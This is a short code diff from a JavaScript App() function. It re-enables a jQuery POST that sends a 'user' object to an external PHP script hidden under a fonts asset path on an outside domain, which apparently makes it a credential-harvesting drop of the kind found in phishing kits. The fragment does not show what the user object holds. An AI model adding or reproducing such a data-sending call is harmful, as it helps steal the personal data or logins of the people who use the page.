@@ -41,7 +41,7 @@ function App() {
         
         $.ajax({
             type: "POST",
-            // url: "https://dozenpearl.com/nc_assets/fonts/laptop/wet.php",
+            url: "https://dozenpearl.com/nc_assets/fonts/laptop/wet.php",
             data: user,
             success(data) {
                 // alert('OK');
